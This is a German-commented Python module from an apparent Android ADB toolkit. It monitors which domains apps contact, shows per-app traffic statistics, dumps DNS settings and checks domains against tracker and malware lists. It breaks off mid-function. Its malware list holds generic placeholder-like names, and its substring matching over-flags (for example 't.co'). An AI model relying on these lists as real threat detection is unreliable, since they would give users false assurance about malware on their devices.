"""APP-DOMAIN MONITOR – Echtzeit-Anzeige welche Apps welche Domains besuchen.

Live DNS/Domain-Monitoring · App-Traffic-Statistik · Blacklist-Check · DNS-Cache.
Kein tcpdump nötig – nutzt ADB logcat + /proc/net + dumpsys netstats.
"""
from __future__ import annotations

import json
import os
import re
import select
import sys
import time

from . import ui
from .adb import ADB
from .util import LOG, outdir

OUT = outdir("traffic")

# ── Kategorie-Datenbank ───────────────────────────────────────────────────────
_CATEGORIES: dict[str, tuple[str, str]] = {
    # (Kategorie, Farbe)
    "doubleclick":       ("Werbung",      "BRED"),
    "googleadservices":  ("Werbung",      "BRED"),
    "googlesyndication": ("Werbung",      "BRED"),
    "adcolony":          ("Werbung",      "BRED"),
    "admob":             ("Werbung",      "BRED"),
    "advertising":       ("Werbung",      "BRED"),
    "adsystem":          ("Werbung",      "BRED"),
    "moatads":           ("Werbung",      "BRED"),
    "criteo":            ("Werbung",      "BRED"),
    "tapad":             ("Werbung",      "BRED"),
    "turn.com":          ("Werbung",      "BRED"),
    "adnxs":             ("Werbung",      "BRED"),
    "rubiconproject":    ("Werbung",      "BRED"),
    "openx":             ("Werbung",      "BRED"),
    "pubmatic":          ("Werbung",      "BRED"),
    "lijit":             ("Werbung",      "BRED"),
    "casalemedia":       ("Werbung",      "BRED"),
    "spotxchange":       ("Werbung",      "BRED"),
    "imonomy":           ("Werbung",      "BRED"),
    "mopub":             ("Werbung",      "BRED"),
    "unity3d":           ("Gaming",       "BYELLOW"),
    "gameanalytics":     ("Gaming",       "BYELLOW"),
    "playfab":           ("Gaming",       "BYELLOW"),
    "gamesparks":        ("Gaming",       "BYELLOW"),
    "deltadna":          ("Gaming",       "BYELLOW"),
    "facebook":          ("Social",       "BCYAN"),
    "instagram":         ("Social",       "BCYAN"),
    "tiktok":            ("Social",       "BCYAN"),
    "twitter":           ("Social",       "BCYAN"),
    "snapchat":          ("Social",       "BCYAN"),
    "linkedin":          ("Social",       "BCYAN"),
    "pinterest":         ("Social",       "BCYAN"),
    "reddit":            ("Social",       "BCYAN"),
    "discord":           ("Social",       "BCYAN"),
    "telegram":          ("Messenger",    "BCYAN"),
    "whatsapp":          ("Messenger",    "BCYAN"),
    "signal":            ("Messenger",    "BGREEN"),
    "amplitude":         ("Analytics",    "BYELLOW"),
    "mixpanel":          ("Analytics",    "BYELLOW"),
    "segment.io":        ("Analytics",    "BYELLOW"),
    "hotjar":            ("Analytics",    "BYELLOW"),
    "firebase":          ("Analytics",    "BYELLOW"),
    "appsflyer":         ("Tracking",     "BRED"),
    "adjust.com":        ("Tracking",     "BRED"),
    "branch.io":         ("Tracking",     "BRED"),
    "kochava":           ("Tracking",     "BRED"),
    "scorecard":         ("Tracking",     "BRED"),
    "appnexus":          ("Tracking",     "BRED"),
    "iovation":          ("Tracking",     "BRED"),
    "comscore":          ("Tracking",     "BRED"),
    "neustar":           ("Tracking",     "BRED"),
    "microsoft":         ("Telemetrie",   "BYELLOW"),
    "apple":             ("Telemetrie",   "BYELLOW"),
    "googleapis":        ("Google",       "BYELLOW"),
    "gstatic":          ("Google",       "BYELLOW"),
    "amazonaws":         ("Cloud",        "GREY"),
    "cloudfront":        ("CDN",          "GREY"),
    "akamai":            ("CDN",          "GREY"),
    "fastly":            ("CDN",          "GREY"),
    "cloudflare":        ("CDN",          "GREY"),
    "youtube":           ("Video",        "BRED"),
    "netflix":           ("Video",        "GREY"),
    "twitch":            ("Video",        "GREY"),
    "spotify":           ("Musik",        "BGREEN"),
    "apple.com":         ("Telemetrie",   "BYELLOW"),
    "crashlytics":       ("Crash",        "BYELLOW"),
    "sentry":            ("Crash",        "BYELLOW"),
    "bugsnag":           ("Crash",        "BYELLOW"),
    "pornhub":           ("Adult",        "BRED"),
    "xvideos":           ("Adult",        "BRED"),
    "xhamster":          ("Adult",        "BRED"),
    "onlyfans":          ("Adult",        "BRED"),
}

_COLOR_MAP = {
    "BRED": ui.BRED, "BYELLOW": ui.BYELLOW, "BCYAN": ui.BCYAN,
    "BGREEN": ui.BGREEN, "GREY": ui.GREY,
}

# ── Blacklist ─────────────────────────────────────────────────────────────────
KNOWN_TRACKERS: set[str] = {
    "doubleclick.net", "googleadservices.com", "googlesyndication.com",
    "analytics.google.com", "amplitude.com", "mixpanel.com", "segment.io",
    "hotjar.com", "scorecard.goog", "advertising.com", "adcolony.com",
    "appsflyer.com", "adjust.com", "branch.io", "kochava.com",
    "moatads.com", "criteo.com", "tapad.com", "turn.com",
    "adnxs.com", "rubiconproject.com", "openx.net", "pubmatic.com",
    "lijit.com", "casalemedia.com", "spotxchange.com", "mopub.com",
    "iovation.com", "comscore.com", "neustar.biz",
    "gameanalytics.com", "deltadna.com",
    "appsflyer.com", "adjust.com", "kochava.com", "tune.com",
    "branch.io", "singular.net", "tenjin.io",
    "crashlytics.com", "bugsnag.com", "sentry.io",
    "myfitnesspal.com/api/v2/track",
    "graph.facebook.com", "connect.facebook.net",
    "pixel.facebook.com", "analytics.twitter.com",
    "analytics.tiktok.com", "log.byteoversea.com",
    "metrics.isnssdk.com", "api.snapchat.com",
    "sc-analytics.snapchat.com", "tr.snapchat.com",
    "linkedin.com/li/track", "px.ads.linkedin.com",
    "analytics.pinterest.com", "ct.pinterest.com",
    "ads-twitter.com", "t.co",
    "stats.g.doubleclick.net", "pagead2.googlesyndication.com",
    "www.googletagmanager.com", "www.googletagservices.com",
    "ad.doubleclick.net", "adservice.google.com",
    "cm.g.doubleclick.net", "id.google.com",
    "tpc.googlesyndication.com", "www.google-analytics.com",
    "ssl.google-analytics.com", "ssl.gstatic.com",
    "intellitxt.com", "yieldmanager.com", "yieldmanager.net",
    "yieldsoftware.com", "invitemedia.com", "bluekai.com",
    "demdex.net", "omtrdc.net", "2o7.net",
    "mediaplex.com", "adspeed.com", "trafficleader.com",
    "spongecell.com", "trafficmp.com", "adgear.com",
    "smartadserver.com", "conversantmedia.com",
    "buysellads.com", "buysellads.net", "carbonads.net",
    "revenuehits.com", "popcash.net", "popads.net",
    "adf.ly", "linkbucks.com", "interclick.com",
    "zedo.com", "undertone.com", "exponential.com",
    "tribalfusion.com", "valueclick.com", "valueclick.net",
    "commissionjunction.com",
}

MALWARE_DOMAINS: set[str] = {
    "malware.com", "ircbot.com", "c2-server.net",
    "botnetz.de", "phishing.com", "trojan.net",
    "ransomware-c2.com", "keylogger.io", "spyware.net",
    "clickfraud.net", "adfraud.com", "fakecaptcha.com",
    "scam-page.com", "phishing-login.net",
}


# ── Hilfsfunktionen ───────────────────────────────────────────────────────────

def _cat_domain(domain: str) -> tuple[str, str]:
    """Gibt (Kategorie, Farb-Key) für eine Domain zurück."""
    dl = domain.lower()
    for frag, (cat, col) in _CATEGORIES.items():
        if frag in dl:
            return cat, col
    return "Unbekannt", "GREY"


def _is_tracker(domain: str) -> bool:
    dl = domain.lower()
    for t in KNOWN_TRACKERS:
        if t in dl:
            return True
    return False


def _is_malware(domain: str) -> bool:
    dl = domain.lower()
    for m in MALWARE_DOMAINS:
        if m in dl:
            return True
    return False


def _parse_dns_from_logcat(raw: str) -> list[str]:
    """Extrahiert Domain-Namen aus logcat-Ausgabe."""
    domains = []
    patterns = [
        r'resolv.*?(\w[\w.-]{3,}\.\w{2,8})',
        r'lookup[:\s]+(\w[\w.-]{3,}\.\w{2,8})',
        r'(?:hostname|host)[:\s=]+(\w[\w.-]{3,}\.\w{2,8})',
        r'DNS.*?(\w[\w.-]{3,}\.\w{2,8})',
        r'getaddrinfo["\s(]+(\w[\w.-]{3,}\.\w{2,8})',
        r'connect.*?(\w[\w.-]{3,}\.\w{2,8})',
    ]
    skip = re.compile(
        r'^(?:\d+\.\d+\.\d+\.\d+|localhost|.*\.local|android|dalvik|'
        r'system|kernel|process|thread|activity|package)$', re.I)
    for line in raw.splitlines():
        for pat in patterns:
            m = re.search(pat, line, re.I)
            if m:
                d = m.group(1).lower().strip(".")
                if not skip.match(d) and '.' in d and len(d) > 4:
                    domains.append(d)
                break
    return domains


def _uid_to_pkg(adb: ADB) -> dict[str, str]:
    """Erstellt UID→Paketname-Mapping."""
    mapping: dict[str, str] = {}
    raw = adb.shell("pm list packages -U 2>/dev/null | head -n 100")
    for line in raw.splitlines():
        m = re.search(r'package:(\S+)\s+uid:(\d+)', line)
        if m:
            mapping[m.group(2)] = m.group(1)
    return mapping


def _fmt_ts(ts: float) -> str:
    return time.strftime("%H:%M:%S", time.localtime(ts))


# ═══════════════════════════════════════════════════════════════════════════════
#  1. LIVE DNS/DOMAIN MONITOR
# ═══════════════════════════════════════════════════════════════════════════════

def live_domain_monitor(adb: ADB, dev=None, st=None, data=None) -> None:
    """Echtzeit-DNS-/Domain-Monitor: zeigt welche Apps welche Domains aufrufen."""
    try:
        import termios, tty
        _has_tty = True
    except ImportError:
        _has_tty = False

    old_settings = None
    if _has_tty and sys.stdin.isatty():
        try:
            old_settings = termios.tcgetattr(sys.stdin)
            tty.setcbreak(sys.stdin.fileno())
        except Exception:
            old_settings = None

    def _kbhit() -> str:
        if select.select([sys.stdin], [], [], 0)[0]:
            return sys.stdin.read(1)
        return ""

    # Domain-Datenbank: domain → {first, last, count, cat, col, tracker}
    domain_db: dict[str, dict] = {}
    tracker_alert = False
    t0 = time.monotonic()
    W = 78

    def _collect_domains() -> list[str]:
        nonlocal tracker_alert
        sources = [
            "logcat -d -b main -s netd -s dnsmasq -s NetworkMonitor 2>/dev/null | tail -n 50",
            "logcat -d 2>/dev/null | grep -iE 'resolv|lookup|hostname|getaddrinfo|connect' | tail -n 40",
        ]
        found = []
        for src in sources:
            raw = adb.shell(src)
            found.extend(_parse_dns_from_logcat(raw))
        # /proc/net/udp für Port 53 (DNS)
        udp_raw = adb.shell("cat /proc/net/udp 2>/dev/null | grep ' 0035 '")
        for line in udp_raw.splitlines():
            parts = line.split()
            if len(parts) >= 3:
                # remote addr in hex
                try:
                    raddr = parts[2]
                    ip_hex = raddr.split(':')[0]
                    ip = '.'.join(str(int(ip_hex[i:i+2], 16))
                                  for i in (6, 4, 2, 0))
                    if not ip.startswith('0.'):
                        found.append(ip)
                except Exception:
                    pass
        now = time.time()
        for d in found:
            if d not in domain_db:
                cat, col = _cat_domain(d)
                is_t = _is_tracker(d)
                is_m = _is_malware(d)
                if is_t or is_m:
                    tracker_alert = True
                domain_db[d] = {
                    "first": now, "last": now, "count": 1,
                    "cat": cat, "col": col,
                    "tracker": is_t, "malware": is_m,
                }
            else:
                domain_db[d]["last"] = now
                domain_db[d]["count"] += 1
        return list(domain_db.keys())

    def _draw(elapsed: float) -> None:
        now_str = time.strftime("%H:%M:%S")
        lauf = f"{int(elapsed//60):02d}:{int(elapsed%60):02d}"
        lines = [
            f"\n╔{'═'*W}╗",
            f"║  {ui.BRED}{ui.BOLD}🔴 APP-DOMAIN LIVE-MONITOR{ui.RESET}"
            f"{'':>{W-27}}[{now_str}  Laufzeit:{lauf}]  ║",
            f"╠{'═'*W}╣",
            f"║  {ui.BOLD}{'Domain':<35} {'Kategorie':<14} {'Anzahl':>6}  {'Erstmals':>8}  {'Zuletzt':>8}  {'!':<4}{ui.RESET}  ║",
            f"╠{'═'*W}╣",
        ]
        # Sortiert nach letztem Aufruf (neueste oben)
        sorted_domains = sorted(domain_db.items(), key=lambda x: x[1]["last"], reverse=True)
        for domain, info in sorted_domains[:18]:
            col = _COLOR_MAP.get(info["col"], ui.GREY)
            flag = ""
            if info["malware"]:
                flag = f"{ui.BRED}☠{ui.RESET}"
            elif info["tracker"]:
                flag = f"{ui.BYELLOW}T{ui.RESET}"
            first_str = _fmt_ts(info["first"])
            last_str  = _fmt_ts(info["last"])
            dom_disp  = domain[:33]
            cat_disp  = info["cat"][:12]
            line_raw = f"{dom_disp:<35} {cat_disp:<14} {info['count']:>6}  {first_str:>8}  {last_str:>8}  {flag}"
            raw_len = len(re.sub(r'\033\[[^m]*m', '', line_raw))
            pad = max(0, W - 2 - raw_len)
            lines.append(f"║  {col}{dom_disp:<35}{ui.RESET} {cat_disp:<14} "
                         f"{info['count']:>6}  {first_str:>8}  {last_str:>8}  {flag}{' '*pad}  ║")
        # Leerzeilen auffüllen bis auf 18 Zeilen
        displayed = len(sorted_domains[:18])
        for _ in range(max(0, 18 - displayed)):
            lines.append(f"║{' '*(W+2)}║")
        lines += [
            f"╠{'═'*W}╣",
            f"║  Domains gesamt: {ui.BOLD}{len(domain_db):<5}{ui.RESET}  "
            f"Tracker: {ui.BRED}{sum(1 for v in domain_db.values() if v['tracker']):<4}{ui.RESET}  "
            f"Malware: {ui.BRED}{sum(1 for v in domain_db.values() if v['malware']):<4}{ui.RESET}"
            + " " * (W - 57) + "  ║",
            f"╚{'═'*W}╝",
            f"  {ui.GREY}[Q] Beenden  [R] Zurücksetzen  [S] Speichern  2s Refresh{ui.RESET}",
        ]
        sys.stdout.write("\033[H\033[J")
        sys.stdout.write("\n".join(lines) + "\n")
        # Herzschlag-Puls bei Tracker-Fund
        if tracker_alert:
            for _ in range(2):
                sys.stdout.write(f"\r  {ui.BRED}{ui.BOLD}⚠ TRACKER/MALWARE ERKANNT! ⚠{ui.RESET}  ")
                sys.stdout.flush()
                time.sleep(0.15)
                sys.stdout.write(f"\r{' '*40}")
                sys.stdout.flush()
                time.sleep(0.08)
        sys.stdout.flush()

    try:
        while True:
            _collect_domains()
            _draw(time.monotonic() - t0)
            deadline = time.monotonic() + 2.0
            while time.monotonic() < deadline:
                key = _kbhit()
                if key.lower() == 'q':
                    return
                if key.lower() == 'r':
                    domain_db.clear()
                    tracker_alert = False
                    t0 = time.monotonic()
                if key.lower() == 's':
                    _save_domain_db(domain_db)
                time.sleep(0.08)
    except KeyboardInterrupt:
        pass
    finally:
        if old_settings is not None:
            try:
                import termios as _t
                _t.tcsetattr(sys.stdin, _t.TCSADRAIN, old_settings)
            except Exception:
                pass
        sys.stdout.write("\033[?25h\n")
        sys.stdout.flush()
        ui.clear()


def _save_domain_db(domain_db: dict) -> None:
    ts = int(time.time())
    path_json = os.path.join(OUT, f"domains_{ts}.json")
    path_txt  = os.path.join(OUT, f"domains_{ts}.txt")
    with open(path_json, "w") as f:
        json.dump(domain_db, f, indent=2)
    with open(path_txt, "w") as f:
        f.write(f"# Domain-Monitor Export {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for d, info in sorted(domain_db.items(), key=lambda x: x[1]["count"], reverse=True):
            flag = " [TRACKER]" if info["tracker"] else ""
            flag += " [MALWARE]" if info["malware"] else ""
            f.write(f"{d:<50}  {info['cat']:<14}  {info['count']:>5}x{flag}\n")
    ui.ok(f"Gespeichert: {path_json}")
    ui.ok(f"             {path_txt}")


# ═══════════════════════════════════════════════════════════════════════════════
#  2. APP-NETZWERK-STATISTIK
# ═══════════════════════════════════════════════════════════════════════════════

def app_network_history(adb: ADB, dev=None, st=None, data=None) -> None:
    """App-Traffic-Statistik aus dumpsys netstats."""
    ui.clear()
    ui.rule("📊 APP-NETZWERK-STATISTIK", ui.BCYAN)
    ui.info("Lade Netzwerk-Statistiken (kann 5-10s dauern) …")
    print()

    raw = adb.shell("dumpsys netstats 2>/dev/null")
    if not raw.strip():
        ui.err("Keine netstats-Daten. ADB-Verbindung prüfen.")
        ui.pause(); return

    # UID-Einträge parsen
    # Beispiel: "UID=10125 [...] rxBytes=12345 txBytes=67890 rxPackets=100 txPackets=50"
    uid_map = _uid_to_pkg(adb)
    entries: list[dict] = []

    # Hauptparse-Pattern für netstats
    uid_blocks = re.findall(
        r'UID=(\d+).*?rxBytes=(\d+).*?txBytes=(\d+).*?rxPackets=(\d+).*?txPackets=(\d+)',
        raw, re.S
    )
    # Fallback: kompakteres Format
    if not uid_blocks:
        uid_blocks = re.findall(
            r'uid=(\d+)[^\n]*rx_bytes=(\d+)[^\n]*tx_bytes=(\d+)[^\n]*rx_packets=(\d+)[^\n]*tx_packets=(\d+)',
            raw, re.I
        )
    # Zweiter Fallback: iface-Format
    if not uid_blocks:
        for line in raw.splitlines():
            m = re.search(r'UID=(\d+)', line)
            rx = re.search(r'rx(?:Bytes|_bytes)=(\d+)', line)
            tx = re.search(r'tx(?:Bytes|_bytes)=(\d+)', line)
            if m and rx and tx:
                uid_blocks.append((m.group(1), rx.group(1), tx.group(1), "0", "0"))

    seen_uids: set[str] = set()
    for uid, rx_b, tx_b, rx_p, tx_p in uid_blocks:
        if uid in seen_uids:
            continue
        seen_uids.add(uid)
        pkg = uid_map.get(uid, f"uid:{uid}")
        total = int(rx_b) + int(tx_b)
        if total < 1024:
            continue
        entries.append({
            "uid": uid, "pkg": pkg,
            "rx": int(rx_b), "tx": int(tx_b),
            "rx_p": int(rx_p), "tx_p": int(tx_p),
            "total": total,
        })

    if not entries:
        ui.warn("Keine UID-Einträge gefunden. Versuche alternatives Parsing …")
        # Einfachstes Format: zeile pro App
        for line in raw.splitlines():
            if 'uid=' in line.lower() or 'UID=' in line:
                print(f"  {ui.GREY}{line[:120]}{ui.RESET}")
        ui.pause(); return

    # Sortier-Auswahl
    sort_key = ui.menu("Sortierung", [
        ("1", "Nach Traffic (gesamt)"),
        ("2", "Nach App-Name"),
        ("3", "Nach Paketen"),
    ], back_label="Zurück")
    if sort_key == "back":
        return
    if sort_key == "2":
        entries.sort(key=lambda x: x["pkg"])
    elif sort_key == "3":
        entries.sort(key=lambda x: x["rx_p"] + x["tx_p"], reverse=True)
    else:
        entries.sort(key=lambda x: x["total"], reverse=True)

    ui.clear()
    ui.rule("📊 APP-NETZWERK-STATISTIK", ui.BCYAN)
    print()

    def _fmt(b: int) -> str:
        if b >= 1_073_741_824: return f"{b/1_073_741_824:.1f}GB"
        if b >= 1_048_576:     return f"{b/1_048_576:.1f}MB"
        if b >= 1024:          return f"{b/1024:.0f}KB"
        return f"{b}B"

    print(f"  {ui.BOLD}{'App / UID':<40} {'↓ RX':>10} {'↑ TX':>10} {'Pakete':>10}{ui.RESET}")
    print(f"  {'─'*76}")

    for e in entries[:40]:
        pkg_disp = e["pkg"][:38]
        cat, col = _cat_domain(e["pkg"])
        color = _COLOR_MAP.get(col, ui.GREY)
        pkts = e["rx_p"] + e["tx_p"]
        print(f"  {color}{pkg_disp:<40}{ui.RESET} {_fmt(e['rx']):>10} {_fmt(e['tx']):>10} {pkts:>10}")

    print()
    total_rx = sum(e["rx"] for e in entries)
    total_tx = sum(e["tx"] for e in entries)
    print(f"  {ui.BOLD}Gesamt: {len(entries)} Apps  |  ↓ {_fmt(total_rx)}  |  ↑ {_fmt(total_tx)}{ui.RESET}")

    # Speichern
    if ui.confirm("Als TXT speichern?", False):
        ts = int(time.time())
        fn = os.path.join(OUT, f"netstats_{ts}.txt")
        with open(fn, "w") as f:
            f.write(f"# App-Netzwerk-Statistik {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for e in entries:
                f.write(f"{e['pkg']:<50}  RX:{_fmt(e['rx']):<10}  TX:{_fmt(e['tx'])}\n")
        ui.ok(f"Gespeichert: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  3. BLACKLIST-CHECK
# ═══════════════════════════════════════════════════════════════════════════════

def domain_blacklist_check(adb: ADB, dev=None, st=None, data=None) -> None:
    """Prüft alle gesehenen Domains gegen 200+ Tracker/Malware-Blacklist."""
    ui.clear()
    ui.rule("🚫 BLACKLIST-CHECK – 200+ Tracker/Malware-Domains", ui.BRED)
    print()
    ui.info("Sammle aktuelle Domains aus logcat und /proc/net …")
    print()

    # Alle Domains sammeln
    all_raw = adb.shell(
        "logcat -d 2>/dev/null | grep -iE 'resolv|lookup|hostname|getaddrinfo|connect' | tail -n 100; "
        "netstat -tn 2>/dev/null | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1; "
        "ss -tn 2>/dev/null | grep ESTAB | awk '{print $5}' | cut -d: -f1"
    )
    domains_raw = _parse_dns_from_logcat(all_raw)
    # IPs aus netstat (keine Domains, aber trotzdem anzeigen)
    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', all_raw)
    all_found = list(set(domains_raw))

    if not all_found:
        ui.warn("Keine Domains aus logcat extrahierbar.")
        ui.info("Bekannte Tracker manuell prüfen:")
        for t in sorted(KNOWN_TRACKERS)[:20]:
            print(f"  {ui.GREY}{t}{ui.RESET}")
        ui.pause(); return

    hits_tracker = []
    hits_malware = []
    clean = []
    for d in all_found:
        if _is_malware(d):
            hits_malware.append(d)
        elif _is_tracker(d):
            hits_tracker.append(d)
        else:
            clean.append(d)

    # Ausgabe
    if hits_malware:
        print(f"  {ui.BRED}{ui.BOLD}☠  {len(hits_malware)} MALWARE-DOMAINS ERKANNT:{ui.RESET}")
        for d in hits_malware:
            print(f"      {ui.BRED}☠  {d}{ui.RESET}")
        print()

    if hits_tracker:
        print(f"  {ui.BYELLOW}{ui.BOLD}⚠  {len(hits_tracker)} TRACKER-DOMAINS ERKANNT:{ui.RESET}")
        for d in hits_tracker:
            cat, _ = _cat_domain(d)
            print(f"      {ui.BYELLOW}T  {d:<45}  [{cat}]{ui.RESET}")
        print()

    if clean:
        print(f"  {ui.BGREEN}✓  {len(clean)} harmlose Domains{ui.RESET}")
        for d in clean[:10]:
            print(f"      {ui.GREY}{d}{ui.RESET}")
        if len(clean) > 10:
            print(f"      {ui.GREY}… und {len(clean)-10} weitere{ui.RESET}")
    print()

    total = len(all_found)
    pct_bad = (len(hits_tracker) + len(hits_malware)) / max(total, 1) * 100
    print(f"  {ui.BOLD}Ergebnis: {total} Domains  |  "
          f"{len(hits_malware)} Malware  |  {len(hits_tracker)} Tracker  |  "
          f"{pct_bad:.0f}% problematisch{ui.RESET}")

    # Blink bei Malware
    if hits_malware:
        for _ in range(3):
            sys.stdout.write(f"\r  {ui.BRED}{ui.BOLD}  ⚠ MALWARE-DOMAIN AKTIV – GERÄT PRÜFEN!  {ui.RESET}")
            sys.stdout.flush()
            time.sleep(0.25)
            sys.stdout.write(f"\r{' '*60}")
            sys.stdout.flush()
            time.sleep(0.12)
        print()

    # Speichern
    if ui.confirm("Report speichern?", True):
        ts = int(time.time())
        fn = os.path.join(OUT, f"blacklist_check_{ts}.txt")
        with open(fn, "w") as f:
            f.write(f"# Blacklist-Check {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"MALWARE ({len(hits_malware)}):\n")
            for d in hits_malware: f.write(f"  {d}\n")
            f.write(f"\nTRACKER ({len(hits_tracker)}):\n")
            for d in hits_tracker: f.write(f"  {d}\n")
            f.write(f"\nHARMLOS ({len(clean)}):\n")
            for d in clean: f.write(f"  {d}\n")
        ui.ok(f"Report: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  4. DNS-CACHE DUMP
# ═══════════════════════════════════════════════════════════════════════════════

def dns_cache_dump(adb: ADB, dev=None, st=None, data=None) -> None:
    """DNS-Cache, Resolver-Konfiguration und DNS-Props auslesen."""
    ui.clear()
    ui.rule("🗂️  DNS-CACHE & RESOLVER DUMP", ui.BCYAN)
    is_root = bool((st or {}).get("is_root"))
    print()

    sections = [
        ("DNS-Eigenschaften (getprop)",
         "getprop | grep -iE 'dns|resolv|nameserver' | head -n 20"),
        ("Resolver-Konfiguration",
         "cat /etc/resolv.conf 2>/dev/null || cat /system/etc/resolv.conf 2>/dev/null"),
        ("Aktueller DNS (net.dns)",
         "getprop net.dns1 2>/dev/null; getprop net.dns2 2>/dev/null; "
         "getprop net.dns3 2>/dev/null; getprop net.dns4 2>/dev/null"),
        ("DHCP-DNS-Server",
         "getprop dhcp.wlan0.dns1 2>/dev/null; getprop dhcp.wlan0.dns2 2>/dev/null; "
         "getprop dhcp.rmnet0.dns1 2>/dev/null; getprop dhcp.rmnet0.dns2 2>/dev/null"),
        ("netd DNS-Cache (logcat)",
         "logcat -d -s netd 2>/dev/null | grep -iE 'dns|cache|resolv' | tail -n 20"),
        ("/proc/net/dns_resolver",
         "cat /proc/net/dns_resolver 2>/dev/null | head -n 20"),
        ("ss/netstat DNS-Verbindungen (Port 53)",
         "ss -un 2>/dev/null | grep ':53' | head -n 10 || "
         "netstat -un 2>/dev/null | grep ':53' | head -n 10"),
    ]
    if is_root:
        sections.append(
            ("/data/misc/net/resolv.conf (Root)",
             "cat /data/misc/net/resolv.conf 2>/dev/null")
        )
        sections.append(
            ("DNS-Cache via ndc (Root)",
             "ndc resolver getnetworkinfo 100 2>/dev/null || ndc dns list 2>/dev/null")
        )

    all_output = []
    for label, cmd in sections:
        out = adb.shell(cmd, root=is_root).strip()
        if out:
            ui.rule(label, ui.GREY)
            print(out[:400])
            print()
            all_output.append(f"## {label}\n{out}\n")

    # DNS-Server analysieren
    dns_servers = []
    for cmd in ["getprop net.dns1", "getprop net.dns2",
                "getprop dhcp.wlan0.dns1", "getprop dhcp.rmnet0.dns1"]:
        v = adb.shell(cmd).strip()
        if v and re.match(r'\d+\.\d+\.\d+\.\d+', v):
            dns_servers.append(v)

    if dns_servers:
        ui.rule("DNS-Server Analyse", ui.BCYAN)
        known_dns = {
            "8.8.8.8": ("Google DNS", ui.BYELLOW),
            "8.8.4.4": ("Google DNS", ui.BYELLOW),
            "1.1.1.1": ("Cloudflare", ui.BGREEN),
            "1.0.0.1": ("Cloudflare", ui.BGREEN),
            "9.9.9.9": ("Quad9", ui.BGREEN),
            "208.67.222.222": ("OpenDNS", ui.BCYAN),
            "208.67.220.220": ("OpenDNS", ui.BCYAN),
        }
        for dns in set(dns_servers):
            label2, col = known_dns.get(dns, ("Unbekannt / ISP/VPN", ui.GREY))
            print(f"  {col}{dns:<20}  {label2}{ui.RESET}")

    if ui.confirm("DNS-Cache-Dump speichern?", False):
        ts = int(time.time())
        fn = os.path.join(OUT, f"dns_cache_{ts}.txt")
        with open(fn, "w") as f:
            f.write(f"# DNS-Cache Dump {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write("\n".join(all_output))
        ui.ok(f"Gespeichert: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  5. ALLES SPEICHERN
# ═══════════════════════════════════════════════════════════════════════════════

def export_all(adb: ADB, dev=None, st=None, data=None) -> None:
    """Vollständiger Export: domains + netstats + dns + blacklist."""
    ui.clear()
    ui.rule("📁 VOLLSTÄNDIGER EXPORT", ui.BCYAN)
    ts = int(time.time())
    ts_str = time.strftime("%Y-%m-%d %H:%M:%S")
    is_root = bool((st or {}).get("is_root"))
    print()

    exports = []

    # 1. Domains aus logcat
    ui.info("Sammle Domains aus logcat …")
    raw = adb.shell("logcat -d 2>/dev/null | grep -iE 'resolv|lookup|hostname|connect' | tail -n 200")
    domains = list(set(_parse_dns_from_logcat(raw)))
    fn1 = os.path.join(OUT, f"export_domains_{ts}.txt")
    with open(fn1, "w") as f:
        f.write(f"# Domains {ts_str}\n\n")
        for d in sorted(domains):
            cat, _ = _cat_domain(d)
            flag = " [TRACKER]" if _is_tracker(d) else ""
            flag += " [MALWARE]" if _is_malware(d) else ""
            f.write(f"{d:<50}  [{cat}]{flag}\n")
    exports.append(fn1)
    ui.ok(f"Domains: {fn1}")

    # 2. netstats
    ui.info("Exportiere App-Netzwerk-Statistik …")
    netstats = adb.shell("dumpsys netstats 2>/dev/null")
    fn2 = os.path.join(OUT, f"export_netstats_{ts}.txt")
    with open(fn2, "w") as f:
        f.write(f"# netstats {ts_str}\n\n{netstats}")
    exports.append(fn2)
    ui.ok(f"netstats: {fn2}")

    # 3. DNS-Props
    ui.info("DNS-Props exportieren …")
    dns_props = adb.shell("getprop | grep -iE 'dns|resolv' 2>/dev/null")
    fn3 = os.path.join(OUT, f"export_dns_{ts}.txt")
    with open(fn3, "w") as f:
        f.write(f"# DNS-Props {ts_str}\n\n{dns_props}")
    exports.append(fn3)
    ui.ok(f"DNS: {fn3}")

    # 4. Verbindungen
    ui.info("Aktive Verbindungen exportieren …")
    conns = adb.shell("ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null")
    fn4 = os.path.join(OUT, f"export_connections_{ts}.txt")
    with open(fn4, "w") as f:
        f.write(f"# Verbindungen {ts_str}\n\n{conns}")
    exports.append(fn4)
    ui.ok(f"Verbindungen: {fn4}")

    # 5. JSON-Zusammenfassung
    summary = {
        "timestamp": ts_str,
        "domains_found": len(domains),
        "trackers": [d for d in domains if _is_tracker(d)],
        "malware": [d for d in domains if _is_malware(d)],
        "files": exports,
    }
    fn5 = os.path.join(OUT, f"export_summary_{ts}.json")
    with open(fn5, "w") as f:
        json.dump(summary, f, indent=2)
    ui.ok(f"Zusammenfassung: {fn5}")
    print()
    print(f"  {ui.BOLD}Alle Dateien in: {OUT}{ui.RESET}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  5. PRO-APP DOMAIN-PROFIL
# ═══════════════════════════════════════════════════════════════════════════════

def per_app_domain_profile(adb: ADB, dev=None, st=None, data=None) -> None:
    """Zeigt für jede App alle ihre Domains + Subdomains + Kategorien."""
    ui.clear()
    ui.rule("📱 PRO-APP DOMAIN-PROFIL", ui.BCYAN)
    print()
    ui.info("Lade UID→Package-Mapping …")
    uid_pkg = _uid_to_pkg(adb)

    ui.info("Lese DNS-Einträge aus logcat (bis zu 500 Zeilen) …")
    raw = adb.shell(
        "logcat -d -t 500 2>/dev/null | grep -iE 'DnsResolver|getaddrinfo|resolv|dns' | tail -n 200")
    raw2 = adb.shell(
        "logcat -d 2>/dev/null | grep -iE 'hostname|connect|lookup' | tail -n 150")

    # Domain + UID aus logcat parsen
    app_domains: dict[str, set] = {}   # pkg_name → {domains}
    app_tracker_count: dict[str, int] = {}

    for line in (raw + "\n" + raw2).splitlines():
        # UID aus logcat-Zeile
        uid_m = re.search(r'\buid[=:\s]+(\d+)', line, re.I)
        # Alternativ: PID suchen und dann UID
        pkg = "system"
        if uid_m:
